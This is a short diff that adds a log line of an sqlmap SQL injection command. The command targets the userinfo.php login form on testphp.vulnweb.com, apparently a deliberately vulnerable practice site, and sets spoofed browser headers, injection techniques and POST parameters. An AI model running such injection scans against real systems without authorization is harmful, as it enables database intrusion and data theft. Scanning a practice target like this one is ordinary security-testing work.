@@ -1,0 +1,9 @@
+http://testphp.vulnweb.com/userinfo.php (POST)  # sqlmap-dev/sqlmap.py --batch --banner -v 0 --output-dir=testphp_vulnweb_com/sqli_log_files "--headers=User-Agent:Mozilla/5.0 (X11; Linux x86_64;s) Gecko/20100101 Firefox/78.0
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language:en-US,en;q=0.5
+Accept-Encoding:gzip, deflate
+Connection:close
+Upgrade-Insecure-Requests:1
+" --technique UEBQ -u http://testphp.vulnweb.com/userinfo.php --data uname=devmrt&None=devmrt&pass=devmrt --method=POST
+
+uname=devmrt&None=devmrt&pass=devmrt
